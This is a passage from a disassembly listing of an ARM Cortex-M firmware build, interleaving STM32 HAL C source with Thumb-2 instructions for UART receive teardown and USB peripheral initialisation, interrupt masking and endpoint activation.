 8005cba:	68fb      	ldr	r3, [r7, #12]
 8005cbc:	e853 3f00 	ldrex	r3, [r3]
 8005cc0:	60bb      	str	r3, [r7, #8]
   return(result);
 8005cc2:	68bb      	ldr	r3, [r7, #8]
 8005cc4:	f023 0310 	bic.w	r3, r3, #16
 8005cc8:	647b      	str	r3, [r7, #68]	; 0x44
 8005cca:	687b      	ldr	r3, [r7, #4]
 8005ccc:	681b      	ldr	r3, [r3, #0]
 8005cce:	461a      	mov	r2, r3
 8005cd0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005cd2:	61bb      	str	r3, [r7, #24]
 8005cd4:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005cd6:	6979      	ldr	r1, [r7, #20]
 8005cd8:	69ba      	ldr	r2, [r7, #24]
 8005cda:	e841 2300 	strex	r3, r2, [r1]
 8005cde:	613b      	str	r3, [r7, #16]
   return(result);
 8005ce0:	693b      	ldr	r3, [r7, #16]
 8005ce2:	2b00      	cmp	r3, #0
 8005ce4:	d1e6      	bne.n	8005cb4 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005ce6:	687b      	ldr	r3, [r7, #4]
 8005ce8:	2220      	movs	r2, #32
 8005cea:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005cee:	687b      	ldr	r3, [r7, #4]
 8005cf0:	2200      	movs	r2, #0
 8005cf2:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005cf4:	687b      	ldr	r3, [r7, #4]
 8005cf6:	2200      	movs	r2, #0
 8005cf8:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005cfa:	bf00      	nop
 8005cfc:	3754      	adds	r7, #84	; 0x54
 8005cfe:	46bd      	mov	sp, r7
 8005d00:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d04:	4770      	bx	lr

08005d06 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005d06:	b084      	sub	sp, #16
 8005d08:	b480      	push	{r7}
 8005d0a:	b083      	sub	sp, #12
 8005d0c:	af00      	add	r7, sp, #0
 8005d0e:	6078      	str	r0, [r7, #4]
 8005d10:	f107 0014 	add.w	r0, r7, #20
 8005d14:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005d18:	2300      	movs	r3, #0
}
 8005d1a:	4618      	mov	r0, r3
 8005d1c:	370c      	adds	r7, #12
 8005d1e:	46bd      	mov	sp, r7
 8005d20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d24:	b004      	add	sp, #16
 8005d26:	4770      	bx	lr

08005d28 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005d28:	b480      	push	{r7}
 8005d2a:	b085      	sub	sp, #20
 8005d2c:	af00      	add	r7, sp, #0
 8005d2e:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005d30:	687b      	ldr	r3, [r7, #4]
 8005d32:	2200      	movs	r2, #0
 8005d34:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005d38:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005d3c:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005d3e:	68fb      	ldr	r3, [r7, #12]
 8005d40:	b29a      	uxth	r2, r3
 8005d42:	687b      	ldr	r3, [r7, #4]
 8005d44:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005d48:	2300      	movs	r3, #0
}
 8005d4a:	4618      	mov	r0, r3
 8005d4c:	3714      	adds	r7, #20
 8005d4e:	46bd      	mov	sp, r7
 8005d50:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d54:	4770      	bx	lr

08005d56 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005d56:	b480      	push	{r7}
 8005d58:	b085      	sub	sp, #20
 8005d5a:	af00      	add	r7, sp, #0
 8005d5c:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005d5e:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005d62:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005d64:	687b      	ldr	r3, [r7, #4]
 8005d66:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005d6a:	b29a      	uxth	r2, r3
 8005d6c:	68fb      	ldr	r3, [r7, #12]
 8005d6e:	b29b      	uxth	r3, r3
 8005d70:	43db      	mvns	r3, r3
 8005d72:	b29b      	uxth	r3, r3
 8005d74:	4013      	ands	r3, r2
 8005d76:	b29a      	uxth	r2, r3
 8005d78:	687b      	ldr	r3, [r7, #4]
 8005d7a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005d7e:	2300      	movs	r3, #0
}
 8005d80:	4618      	mov	r0, r3
 8005d82:	3714      	adds	r7, #20
 8005d84:	46bd      	mov	sp, r7
 8005d86:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005d8a:	4770      	bx	lr

08005d8c <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005d8c:	b480      	push	{r7}
 8005d8e:	b083      	sub	sp, #12
 8005d90:	af00      	add	r7, sp, #0
 8005d92:	6078      	str	r0, [r7, #4]
 8005d94:	460b      	mov	r3, r1
 8005d96:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005d98:	2300      	movs	r3, #0
}
 8005d9a:	4618      	mov	r0, r3
 8005d9c:	370c      	adds	r7, #12
 8005d9e:	46bd      	mov	sp, r7
 8005da0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005da4:	4770      	bx	lr

08005da6 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005da6:	b084      	sub	sp, #16
 8005da8:	b480      	push	{r7}
 8005daa:	b083      	sub	sp, #12
 8005dac:	af00      	add	r7, sp, #0
 8005dae:	6078      	str	r0, [r7, #4]
 8005db0:	f107 0014 	add.w	r0, r7, #20
 8005db4:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005db8:	687b      	ldr	r3, [r7, #4]
 8005dba:	2201      	movs	r2, #1
 8005dbc:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005dc0:	687b      	ldr	r3, [r7, #4]
 8005dc2:	2200      	movs	r2, #0
 8005dc4:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005dc8:	687b      	ldr	r3, [r7, #4]
 8005dca:	2200      	movs	r2, #0
 8005dcc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005dd0:	687b      	ldr	r3, [r7, #4]
 8005dd2:	2200      	movs	r2, #0
 8005dd4:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005dd8:	2300      	movs	r3, #0
}
 8005dda:	4618      	mov	r0, r3
 8005ddc:	370c      	adds	r7, #12
 8005dde:	46bd      	mov	sp, r7
 8005de0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005de4:	b004      	add	sp, #16
 8005de6:	4770      	bx	lr

08005de8 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005de8:	b480      	push	{r7}
 8005dea:	b083      	sub	sp, #12
 8005dec:	af00      	add	r7, sp, #0
 8005dee:	6078      	str	r0, [r7, #4]
 8005df0:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005df2:	2300      	movs	r3, #0
}
 8005df4:	4618      	mov	r0, r3
 8005df6:	370c      	adds	r7, #12
 8005df8:	46bd      	mov	sp, r7
 8005dfa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005dfe:	4770      	bx	lr

08005e00 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005e00:	b480      	push	{r7}
 8005e02:	b083      	sub	sp, #12
 8005e04:	af00      	add	r7, sp, #0
 8005e06:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e08:	2300      	movs	r3, #0
}
 8005e0a:	4618      	mov	r0, r3
 8005e0c:	370c      	adds	r7, #12
 8005e0e:	46bd      	mov	sp, r7
 8005e10:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e14:	4770      	bx	lr
	...

08005e18 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005e18:	b480      	push	{r7}
 8005e1a:	b09d      	sub	sp, #116	; 0x74
 8005e1c:	af00      	add	r7, sp, #0
 8005e1e:	6078      	str	r0, [r7, #4]
 8005e20:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005e22:	2300      	movs	r3, #0
 8005e24:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005e28:	687a      	ldr	r2, [r7, #4]
 8005e2a:	683b      	ldr	r3, [r7, #0]
 8005e2c:	781b      	ldrb	r3, [r3, #0]
 8005e2e:	009b      	lsls	r3, r3, #2
 8005e30:	4413      	add	r3, r2
 8005e32:	881b      	ldrh	r3, [r3, #0]
 8005e34:	b29b      	uxth	r3, r3
 8005e36:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005e3a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005e3e:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005e42:	683b      	ldr	r3, [r7, #0]
 8005e44:	78db      	ldrb	r3, [r3, #3]
 8005e46:	2b03      	cmp	r3, #3
 8005e48:	d81f      	bhi.n	8005e8a <USB_ActivateEndpoint+0x72>
 8005e4a:	a201      	add	r2, pc, #4	; (adr r2, 8005e50 <USB_ActivateEndpoint+0x38>)
 8005e4c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005e50:	08005e61 	.word	0x08005e61
 8005e54:	08005e7d 	.word	0x08005e7d
 8005e58:	08005e93 	.word	0x08005e93
 8005e5c:	08005e6f 	.word	0x08005e6f
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005e60:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005e64:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005e68:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005e6c:	e012      	b.n	8005e94 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005e6e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005e72:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005e76:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005e7a:	e00b      	b.n	8005e94 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005e7c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005e80:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005e84:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005e88:	e004      	b.n	8005e94 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005e8a:	2301      	movs	r3, #1
 8005e8c:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005e90:	e000      	b.n	8005e94 <USB_ActivateEndpoint+0x7c>
      break;
 8005e92:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005e94:	687a      	ldr	r2, [r7, #4]
 8005e96:	683b      	ldr	r3, [r7, #0]
 8005e98:	781b      	ldrb	r3, [r3, #0]
 8005e9a:	009b      	lsls	r3, r3, #2
 8005e9c:	441a      	add	r2, r3
 8005e9e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005ea2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005ea6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005eaa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005eae:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005eb2:	b29b      	uxth	r3, r3
 8005eb4:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005eb6:	687a      	ldr	r2, [r7, #4]
 8005eb8:	683b      	ldr	r3, [r7, #0]
 8005eba:	781b      	ldrb	r3, [r3, #0]
 8005ebc:	009b      	lsls	r3, r3, #2
 8005ebe:	4413      	add	r3, r2
 8005ec0:	881b      	ldrh	r3, [r3, #0]
 8005ec2:	b29b      	uxth	r3, r3
 8005ec4:	b21b      	sxth	r3, r3
 8005ec6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005eca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005ece:	b21a      	sxth	r2, r3
 8005ed0:	683b      	ldr	r3, [r7, #0]
 8005ed2:	781b      	ldrb	r3, [r3, #0]
 8005ed4:	b21b      	sxth	r3, r3
 8005ed6:	4313      	orrs	r3, r2
 8005ed8:	b21b      	sxth	r3, r3
 8005eda:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005ede:	687a      	ldr	r2, [r7, #4]
 8005ee0:	683b      	ldr	r3, [r7, #0]
 8005ee2:	781b      	ldrb	r3, [r3, #0]
 8005ee4:	009b      	lsls	r3, r3, #2
 8005ee6:	441a      	add	r2, r3
 8005ee8:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005eec:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005ef0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005ef4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005ef8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005efc:	b29b      	uxth	r3, r3
 8005efe:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8005f00:	683b      	ldr	r3, [r7, #0]
 8005f02:	7b1b      	ldrb	r3, [r3, #12]
 8005f04:	2b00      	cmp	r3, #0
 8005f06:	f040 8178 	bne.w	80061fa <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 8005f0a:	683b      	ldr	r3, [r7, #0]
 8005f0c:	785b      	ldrb	r3, [r3, #1]
 8005f0e:	2b00      	cmp	r3, #0
 8005f10:	f000 8084 	beq.w	800601c <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8005f14:	687b      	ldr	r3, [r7, #4]
 8005f16:	61bb      	str	r3, [r7, #24]
 8005f18:	687b      	ldr	r3, [r7, #4]
 8005f1a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8005f1e:	b29b      	uxth	r3, r3
 8005f20:	461a      	mov	r2, r3
 8005f22:	69bb      	ldr	r3, [r7, #24]
 8005f24:	4413      	add	r3, r2
 8005f26:	61bb      	str	r3, [r7, #24]
 8005f28:	683b      	ldr	r3, [r7, #0]
 8005f2a:	781b      	ldrb	r3, [r3, #0]
 8005f2c:	00da      	lsls	r2, r3, #3
 8005f2e:	69bb      	ldr	r3, [r7, #24]
 8005f30:	4413      	add	r3, r2
 8005f32:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8005f36:	617b      	str	r3, [r7, #20]
 8005f38:	683b      	ldr	r3, [r7, #0]
 8005f3a:	88db      	ldrh	r3, [r3, #6]
 8005f3c:	085b      	lsrs	r3, r3, #1
 8005f3e:	b29b      	uxth	r3, r3
 8005f40:	005b      	lsls	r3, r3, #1
 8005f42:	b29a      	uxth	r2, r3
 8005f44:	697b      	ldr	r3, [r7, #20]
 8005f46:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8005f48:	687a      	ldr	r2, [r7, #4]
 8005f4a:	683b      	ldr	r3, [r7, #0]
 8005f4c:	781b      	ldrb	r3, [r3, #0]
 8005f4e:	009b      	lsls	r3, r3, #2
 8005f50:	4413      	add	r3, r2
 8005f52:	881b      	ldrh	r3, [r3, #0]
 8005f54:	827b      	strh	r3, [r7, #18]
 8005f56:	8a7b      	ldrh	r3, [r7, #18]
 8005f58:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005f5c:	2b00      	cmp	r3, #0
 8005f5e:	d01b      	beq.n	8005f98 <USB_ActivateEndpoint+0x180>
 8005f60:	687a      	ldr	r2, [r7, #4]
 8005f62:	683b      	ldr	r3, [r7, #0]
 8005f64:	781b      	ldrb	r3, [r3, #0]
 8005f66:	009b      	lsls	r3, r3, #2
 8005f68:	4413      	add	r3, r2
 8005f6a:	881b      	ldrh	r3, [r3, #0]
 8005f6c:	b29b      	uxth	r3, r3
 8005f6e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005f72:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f76:	823b      	strh	r3, [r7, #16]
 8005f78:	687a      	ldr	r2, [r7, #4]
 8005f7a:	683b      	ldr	r3, [r7, #0]
 8005f7c:	781b      	ldrb	r3, [r3, #0]
 8005f7e:	009b      	lsls	r3, r3, #2
 8005f80:	441a      	add	r2, r3
 8005f82:	8a3b      	ldrh	r3, [r7, #16]
 8005f84:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005f88:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005f8c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005f90:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8005f94:	b29b      	uxth	r3, r3
 8005f96:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8005f98:	683b      	ldr	r3, [r7, #0]
 8005f9a:	78db      	ldrb	r3, [r3, #3]
 8005f9c:	2b01      	cmp	r3, #1
 8005f9e:	d020      	beq.n	8005fe2 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8005fa0:	687a      	ldr	r2, [r7, #4]
 8005fa2:	683b      	ldr	r3, [r7, #0]
 8005fa4:	781b      	ldrb	r3, [r3, #0]
 8005fa6:	009b      	lsls	r3, r3, #2
 8005fa8:	4413      	add	r3, r2
 8005faa:	881b      	ldrh	r3, [r3, #0]
 8005fac:	b29b      	uxth	r3, r3
 8005fae:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005fb2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8005fb6:	81bb      	strh	r3, [r7, #12]
 8005fb8:	89bb      	ldrh	r3, [r7, #12]
 8005fba:	f083 0320 	eor.w	r3, r3, #32
 8005fbe:	81bb      	strh	r3, [r7, #12]
 8005fc0:	687a      	ldr	r2, [r7, #4]
 8005fc2:	683b      	ldr	r3, [r7, #0]
 8005fc4:	781b      	ldrb	r3, [r3, #0]
 8005fc6:	009b      	lsls	r3, r3, #2
 8005fc8:	441a      	add	r2, r3
 8005fca:	89bb      	ldrh	r3, [r7, #12]
 8005fcc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005fd0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005fd4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005fd8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005fdc:	b29b      	uxth	r3, r3
 8005fde:	8013      	strh	r3, [r2, #0]
 8005fe0:	e2d5      	b.n	800658e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8005fe2:	687a      	ldr	r2, [r7, #4]
 8005fe4:	683b      	ldr	r3, [r7, #0]
 8005fe6:	781b      	ldrb	r3, [r3, #0]
 8005fe8:	009b      	lsls	r3, r3, #2
 8005fea:	4413      	add	r3, r2
 8005fec:	881b      	ldrh	r3, [r3, #0]
 8005fee:	b29b      	uxth	r3, r3
 8005ff0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005ff4:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8005ff8:	81fb      	strh	r3, [r7, #14]
 8005ffa:	687a      	ldr	r2, [r7, #4]
 8005ffc:	683b      	ldr	r3, [r7, #0]
 8005ffe:	781b      	ldrb	r3, [r3, #0]
 8006000:	009b      	lsls	r3, r3, #2
 8006002:	441a      	add	r2, r3
 8006004:	89fb      	ldrh	r3, [r7, #14]
 8006006:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800600a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800600e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006012:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006016:	b29b      	uxth	r3, r3
 8006018:	8013      	strh	r3, [r2, #0]
 800601a:	e2b8      	b.n	800658e <USB_ActivateEndpoint+0x776>
      }
    }
    else
    {
      /* Set the endpoint Receive buffer address */
      PCD_SET_EP_RX_ADDRESS(USBx, ep->num, ep->pmaadress);
 800601c:	687b      	ldr	r3, [r7, #4]
 800601e:	633b      	str	r3, [r7, #48]	; 0x30
 8006020:	687b      	ldr	r3, [r7, #4]
 8006022:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006026:	b29b      	uxth	r3, r3
 8006028:	461a      	mov	r2, r3
 800602a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 800602c:	4413      	add	r3, r2
 800602e:	633b      	str	r3, [r7, #48]	; 0x30
 8006030:	683b      	ldr	r3, [r7, #0]
 8006032:	781b      	ldrb	r3, [r3, #0]
 8006034:	00da      	lsls	r2, r3, #3
 8006036:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006038:	4413      	add	r3, r2
 800603a:	f203 4304 	addw	r3, r3, #1028	; 0x404
 800603e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006040:	683b      	ldr	r3, [r7, #0]
 8006042:	88db      	ldrh	r3, [r3, #6]
 8006044:	085b      	lsrs	r3, r3, #1
 8006046:	b29b      	uxth	r3, r3
 8006048:	005b      	lsls	r3, r3, #1
 800604a:	b29a      	uxth	r2, r3
 800604c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 800604e:	801a      	strh	r2, [r3, #0]

      /* Set the endpoint Receive buffer counter */
      PCD_SET_EP_RX_CNT(USBx, ep->num, ep->maxpacket);
 8006050:	687b      	ldr	r3, [r7, #4]
 8006052:	62bb      	str	r3, [r7, #40]	; 0x28
 8006054:	687b      	ldr	r3, [r7, #4]
 8006056:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800605a:	b29b      	uxth	r3, r3
 800605c:	461a      	mov	r2, r3
 800605e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006060:	4413      	add	r3, r2
 8006062:	62bb      	str	r3, [r7, #40]	; 0x28
 8006064:	683b      	ldr	r3, [r7, #0]
 8006066:	781b      	ldrb	r3, [r3, #0]
 8006068:	00da      	lsls	r2, r3, #3
 800606a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 800606c:	4413      	add	r3, r2
 800606e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006072:	627b      	str	r3, [r7, #36]	; 0x24
 8006074:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006076:	881b      	ldrh	r3, [r3, #0]
 8006078:	b29b      	uxth	r3, r3
 800607a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800607e:	b29a      	uxth	r2, r3
 8006080:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006082:	801a      	strh	r2, [r3, #0]
 8006084:	683b      	ldr	r3, [r7, #0]
 8006086:	691b      	ldr	r3, [r3, #16]
 8006088:	2b3e      	cmp	r3, #62	; 0x3e
 800608a:	d91d      	bls.n	80060c8 <USB_ActivateEndpoint+0x2b0>
 800608c:	683b      	ldr	r3, [r7, #0]
 800608e:	691b      	ldr	r3, [r3, #16]
 8006090:	095b      	lsrs	r3, r3, #5
 8006092:	66bb      	str	r3, [r7, #104]	; 0x68
 8006094:	683b      	ldr	r3, [r7, #0]
 8006096:	691b      	ldr	r3, [r3, #16]
 8006098:	f003 031f 	and.w	r3, r3, #31
 800609c:	2b00      	cmp	r3, #0
 800609e:	d102      	bne.n	80060a6 <USB_ActivateEndpoint+0x28e>
 80060a0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80060a2:	3b01      	subs	r3, #1
 80060a4:	66bb      	str	r3, [r7, #104]	; 0x68
 80060a6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80060a8:	881b      	ldrh	r3, [r3, #0]
 80060aa:	b29a      	uxth	r2, r3
 80060ac:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80060ae:	b29b      	uxth	r3, r3
 80060b0:	029b      	lsls	r3, r3, #10
 80060b2:	b29b      	uxth	r3, r3
 80060b4:	4313      	orrs	r3, r2
 80060b6:	b29b      	uxth	r3, r3
 80060b8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80060bc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80060c0:	b29a      	uxth	r2, r3
 80060c2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80060c4:	801a      	strh	r2, [r3, #0]
 80060c6:	e026      	b.n	8006116 <USB_ActivateEndpoint+0x2fe>
 80060c8:	683b      	ldr	r3, [r7, #0]
 80060ca:	691b      	ldr	r3, [r3, #16]
 80060cc:	2b00      	cmp	r3, #0
 80060ce:	d10a      	bne.n	80060e6 <USB_ActivateEndpoint+0x2ce>
 80060d0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80060d2:	881b      	ldrh	r3, [r3, #0]
 80060d4:	b29b      	uxth	r3, r3
 80060d6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80060da:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80060de:	b29a      	uxth	r2, r3
 80060e0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80060e2:	801a      	strh	r2, [r3, #0]
 80060e4:	e017      	b.n	8006116 <USB_ActivateEndpoint+0x2fe>
 80060e6:	683b      	ldr	r3, [r7, #0]
 80060e8:	691b      	ldr	r3, [r3, #16]
 80060ea:	085b      	lsrs	r3, r3, #1
